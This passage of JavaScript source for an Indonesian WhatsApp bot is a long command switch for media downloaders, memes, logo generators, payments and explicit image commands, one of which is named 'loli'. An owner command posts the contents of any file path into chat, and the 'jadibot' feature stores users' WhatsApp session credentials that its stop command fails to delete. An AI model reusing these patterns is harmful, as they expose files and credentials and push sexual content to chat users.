					Fan.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					break
				case 'rate':

					rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					Fan.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					break
		    case 'tiktokaudio':

		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.error.api)
 		if (!c) return reply('Linknya?')
 		reply(`Bentar Nyett....`)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
    nowmm = await getBuffer(audio)
	Fan.sendMessage(from,nowmm ,MessageType.audio,{mimetype:'audio/mp4',quoted: mek})
		})
		})
		break 
	case 'igstory': 

            if(!c) return reply('Usernamenya?')
            hx.igstory(`${c}`)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    Fan.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    Fan.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'playstore':
  
            if(!c) return reply('lu nyari apa?')
            let play = await hx.playstore(`${c}`)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 *PLAY STORE* 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
            case 'grup':
            ini_txt = `*JOIN GC OFFICIAL*
GC BOT:
https://chat.whatsapp.com/G6EKdDwxuGn9oesUTTwkVX`
reply(ini_txt)
break
		    
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':

            if(!c) return reply('cari group apa?')
            hx.linkwa(`${c}`)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
    case 'otaku':
  
            if(!c) return reply('judul animenya?')
            let anime = await hx.otakudesu(`${c}`)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            Fan.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case 'komiku':
  
            if(!c) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(`${c}`)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break  
		    case 'twmp4': case 'twitter':
		
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(`Bentar Nyett....`)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync('./P3/image/logonya.jpeg')
sendMediaURL(from, Anu, 'Done!')
})
break
case 'twmp3':
		
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(`Bentar Nyett....`)
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
khs = await getBuffer(Anu)
Fan.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'audio.mp3', quoted:mek, ptt:true})
})
break
    case 'chara':
		
            if(!c) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(`${c}`)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await Fan.sendMessage(from,li,image,{quoted: mek})
            break
//Navi
					          case 'unpin':
                if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                Fan.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
            case 'pin':
                if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                Fan.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
             case 'archive':
                if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                reply('*okey wait..*')
                console.log('succes archive chat = ' + from)
                await sleep(3000)
                Fan.modifyChat(from, ChatModification.archive)
                break
            case 'unreadall':
                if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                var chats = await Fan.chats.all()
                chats.map( async ({ jid }) => {
                await Fan.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await Fan.sendMessage(from, teks, text, {quoted: mek})
		    console.log(chats.length)
	        break
            case 'readall':
                if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                var chats = await Fan.chats.all()
                chats.map( async ({ jid }) => {
                await Fan.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await Fan.sendMessage(from, teks, text, {quoted: mek})
		console.log(chats.length)
		break
            case 'unarchiveall':
                if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
                reply('*succes unarchive all chat*')
                console.log('succes unarchive chat = ' + from)
                anu = await Fan.chats.all()
                for (let _ of anu) {
                Fan.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
case 'tutuptime':
		
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(`Khusus Admin Om`)
if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
Fan.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(`Khusus Admin Om`)
if (!isBotGroupAdmins) return reply(`Jdiin Admin Dlu Bjir🗿`)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
Fan.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
case 'leavetime':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
Fan.groupLeave(from);
}, timer)
case 'nano':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (!c) return reply('Nama file nya apaa ?')
anu = fs.readFileSync(`${c}`)
reply(String(anu))
break
case 'setmenu':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if(args[0] == 'ori'){
menusimpel = true
reply('Sucsess')
}else if(args[0] == 'simpel'){
menusimpel = false
reply('Sucsess')
}else if (!c) {
anu =`Silahkan pilih salah satu di bawah`
 buttons = [{buttonId: 'setmenu ori', buttonText: {displayText: 'ORI'}, type: 1},{buttonId: 'setmenu simpel', buttonText: {displayText: 'SIMPEL'}, type: 1}]
const skuygelud = {
    contentText: `${anu}`,
    footerText: '*_Xavhier _*',
    buttons: buttons,
    headerType: 1
}
await Fan.sendMessage(from, skuygelud, MessageType.buttonsMessage, {quoted: ftrol})
}
break
case 'setallmenu':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if(args[0] == 'ori'){
menuall = true
reply('Sucsess')
}else if(args[0] == 'simpel'){
menuall = false
reply('Sucsess')
}else if (!c) {
anu =`Silahkan pilih salah satu di bawah`
 buttons = [{buttonId: 'setallmenu ori', buttonText: {displayText: 'ORI'}, type: 1},{buttonId: 'setallmenu simpel', buttonText: {displayText: 'SIMPEL'}, type: 1}]
const skuygf = {
    contentText: `${anu}`,
    footerText: '*_Xavhier _*',
    buttons: buttons,
    headerType: 1
}
await Fan.sendMessage(from, skuygf, MessageType.buttonsMessage, {quoted: ftrol})
}
break
//Sampai sini
case 'jadibot':   
if (!isOwner && !mek.key.fromMe) return reply(`Minta Sma Owner`)
if(from.endsWith('@g.us')) return reply('Only With Private Chat/PC')
client.version = [2, 2119, 6]
client.browserDescription = ['FanX7@0.0.1 start']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await Buffer.from(qrbot.split('data:image/png;base64,')[1], 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await Fan.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : mek,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
       Fan.deleteMessage(from, scen.key)
  }, 30000);
})  
client.on ('open', async () => {
  console.log ('credentials update')
  const authInfo = client.base64EncodedAuthInfo()
  fs.writeFileSync(`./P1/sampah/sampah/${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
  await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
  client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
})
client.on('chat-update', async (chat) => {
	require('./Fan.js')(client, chat)
})
client.on('chat-update', async (chat) => {
	require('./index.js')(client, chat)
})
await client.connect().then(async ({user}) => {
reply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
reply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
}
break
case 'stopjadibot':
case 'stop':
try {
reply('Oke')
fs.unlinkSync(`./P1/sampah/${sender}.json`)
client.close()
} catch {
reply('Oke')
client.close()
}
break
    case 'order':
menu = ` Hay @${sender.split("@")[0]}
*ITEM BERHASIL DI PILIH*
SILAHKAN KLIK LANJUT
 `
sendButLocation(from, `${menu}`, "*_© STORE BOTZ ゑ_*", {jpegThumbnail:store1,name:""}, [{buttonId:`pay`,buttonText:{displayText:'LANJUT'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})

break
case 'owner':
	case 'creator':
case 'developer':
		case 'author':
let ini_list = []
for (let i of ownerNumber) {
const vname = Fan.contacts[i] != undefined ? Fan.contacts[i].vname || Fan.contacts[i].notify : undefined
ini_list.push({
"displayName": `Developer Xavhier ゑ`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;${NamaOwner};;;\nFN:${vname ? `${vname}` : `${NamaOwner}`}\nitem1.TEL;waid=${NomorOwner}:${NomorOwner2}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
Fan.sendMessage(from, {
"displayName": `Developer Xavhier ゑ`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
break
case 'addcmd': 
case 'setcmd':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (isQuotedSticker) {
if (!c) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, c)
reply("Done Bwang")
} else {
reply('tag stickenya')
}
break
case 'delcmd':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./P2/scommand.json', JSON.stringify(scommand))
reply("Done Bwang")
break
case 'listcmd':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
let teksnyee = `\`\`\`「 LIST CMD STIC 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*❏ ID :* ${i.id}\n*❏ Cmd :* ${i.chats}`
}
reply(teksnyee)
break
case 'piltek':
if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
gifnya = await getBuffer('https://telegra.ph/file/a92a5a213055a6a48f023.mp4')
anu =`${emoji2(prefix)}`
await Fan.sendMessage(from, gifnya, MessageType.video, {mimetype : 'video/mp4', quoted: ftrol, caption: anu})
break
case 'script':
case 'sc':
reply('BELI TOD 40k') 
break
case 'asupan':
lahh = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=${lolkey}`)
			lah = await getBuffer(lahh.result)
			await sendButVideo(from, `@${sender.split("@")[0]}\nClick Button Next For More`, ``,lah, but = [{buttonId: `${prefix + command}`, buttonText: { displayText: `NEXT`}, type: 1}], hia = { quoted: mek, contextInfo: { mentionedJid: [sender]}})
			break
case 'popo':
case 'pargoy':
case 'paregoy':
        
gifnya = await getBuffer('https://telegra.ph/file/f97b5df915dfb2b80ee0c.mp4')
membr.push(goo.jid)
		anu =`*POPO CINTA 💗💃  @${goo.jid.split('@')[0]}* `		
await Fan.sendMessage(from, gifnya, MessageType.video, {mimetype : 'video/gif', quoted: ftrol, thumbnail: gifnya, caption: anu, contextInfo: {mentionedJid: membr}})
break			
case 'donasi':
dona = fs.readFileSync('./P3/donasi.jpg')
doni =`*DONATE NYA KAKA*
╭─❒ 「 Donasi 」 ──────*
*│*
*│*⬡ *Mau donasi apa cuma liat doang?*
*│*⬡ *PULSA     : 08979185922*
*│*⬡ *DANA    : 08979185922*
*│*⬡ *GOPAY    : SCAN DI ATAS AJA*
*└───────────────────*
Scan QR di atas bila belum premium`
Fan.sendMessage(from, dona, image, { quoted: ftrol, thumbnail: dona, caption: doni })
break
case 'qriss':
dona = fs.readFileSync('./P3/donasi.jpg')
doni =`*SCAN KAK*`
Fan.sendMessage(from, dona, image, { quoted: ftrol, thumbnail: dona, caption: doni })
break
case 'pay':
case 'payment':
menu = ` Hay @${sender.split("@")[0]}
Silahkan Pilih Metode Pembayaran
Di Bawah       

 `
sendButLocation(from, `${menu}`, "*_© STORE BOTZ ゑ_*", {jpegThumbnail:store1,name:""}, [{buttonId:`gopay`,buttonText:{displayText:'GOPAY'},type:1},{buttonId:`dana`,buttonText:{displayText:'DANA'},type:1},{buttonId:`qriss`,buttonText:{displayText:'QRIS ALL PAY'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})

break
        case 'dana':
menu = `NO DANA:
0812-2067-0449
A/N T*****i   
LALU KLIK TOMBOL DI BAWAH 
DAN KIRIM BUKTI TF KE KONTAK TERSEBUT
 `
sendButLocation(from, `${menu}`, "*_© STORE BOTZ ゑ_*", {jpegThumbnail:dana,name:""}, [{buttonId:`owner`,buttonText:{displayText:'Lanjut Kirim Bukti Tf'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
break
case 'gopay':
menu = `NO GOPAY TIDAK TERSEDIA
 `
sendButLocation(from, `${menu}`, "*_© STORE BOTZ ゑ_*", {jpegThumbnail:gopay,name:""}, [{buttonId:`owner`,buttonText:{displayText:'Lanjut Kirim Bukti Tf'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
break        

       case 'debug':

			 res = await Fan.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
							"hydratedFooterText": `Xavhier ゑ`,
							"hydratedButtons": [
								{
									"quickreplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickreplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickreplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
Fan.relayWAMessage(res)
break
case 'debug2':

   res = await Fan.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
    "hydratedFooterText": `Xavhier ゑ`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script Xavhier ゑ`,
          "url": "https://github.com/Aztecs777"
        },
        "index": 0
      }
    ]
  }
}
}, {})
Fan.relayWAMessage(res)
break
case 'ig':
case 'igdl':
case 'instagram':

if (!c) return reply('Linknya?')
var { igDownloader } = require('./P1/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
                    

    	case 'tiktokdl': 
       case 'ttdl':
     case 'tiktok':
        case 'ttnowm': 
      case 'tiktoknowm':
             
             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok.com')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
             break
// nfsw
case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                  
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`Nih Om`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
              break
                    case 'darkjokes':
                    case 'meme':
              
              buff = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`Nih Om`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
                    break
                    case 'cewek':
                    case 'cecan':

              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/cecan?apikey=${lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`JANGAN BUAT BAHAN COLI☺`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
                    break
                    case 'cowok':
                    case 'cogan':

              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/cogan?apikey=${lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`JANGAN BUAT BAHAN COLMEK☺`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
                    break
                    
case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':

               buff = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkey}`)
                buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`Nih Om`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
        
                    break
                    case 'zoro': 
                    case 'luffy': 
                    case 'sanji': 
                    case 'ussop': 
                    case 'nami': 
                    case 'copper': 
                    case 'naruto': 
                    case 'minato': 
                    case 'sasuke': 
                    case 'sakura': 
                    case 'boruto': 
                    case 'sarada': 
                    case 'mitsuki': 
                    case 'orochimaru': 
                    case 'tsunade': 
                    case 'kakashi': 
                    case 'killua': 
                    case 'gon': 
                    case 'saitama': 
                    case 'rimuru':                     
                    case 'natsu': 
                    case 'tanjirou': 
                    case 'nezuko': 
                    case 'senku':   
            reply(`Sabar Wibu`)
            Fan1 = await fetchJson(`https://myselfff.herokuapp.com/docs/anime?query=${command}`)
            Fan2 = await getBuffer(Fan1.result.list)
            sendImage(Fan2, "Nih foto " + command + " nya kak:)")
            break
case 'loli':
       case 'husbu':
       case 'milf':
       case 'cosplay':
       case 'wallml':
     
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = ( await Fan.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
                                     case 'bengekmaker':
                                   
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split("/")[0]
                    txt2 = arg.split("/")[1]
                    kon = (`https://api.lolhuman.xyz/api/meme7?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
                    anu = await getBuffer(kon)
                    reply(`MEMBENGEKK`)
Fan.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./P3/image/logonya.jpeg')})
break
case 'terbaikmaker':
                                   
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split("/")[0]
                    txt2 = arg.split("/")[1]
                    kon = (`https://api.lolhuman.xyz/api/meme8?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
                    anu = await getBuffer(kon)
                    reply(`MADEPP🗿👍`)
Fan.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./P3/image/logonya.jpeg')})
break
                    case 'memekertas':
              
if (!c) return reply('Textnya mana gan?')
reply(`OTW TULIS BOSS`)
kon = (`https://api.lolhuman.xyz/api/meme1?apikey=${lolkey}&text=${c}`)
anu = await getBuffer(kon)
Fan.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./P3/image/logonya.jpeg')})
break
                    
                    
case 'neko':
       case 'kanna':
       case 'sagiri':
       case 'megumin':
       case 'wallnime':
     
              reply(mess.wait)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
    
              break
       
       case 'hentai':
       
              reply(mess.wait)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
    
              break
case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length == 0) return reply(`Example: ${prefix + command} FanX7`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        Fan.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Subrek yt : _© Xavhier ゑ_`, quoted : ftrol})
                    })
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length == 0) return reply(`Example: ${prefix + command} FanX7`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        Fan.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Subrek yt : _© Xavhier ゑ_`, quoted : ftrol})
                    })
                    break
                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
              
                    if (args.length == 0) return reply(`Example: ${prefix + command} FanX7`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        Fan.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Nih Om`, quoted : ftrol})
                    })
                    break
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
              
                    if (args.length == 0) return reply(`Example: ${prefix + command} FanX7`)
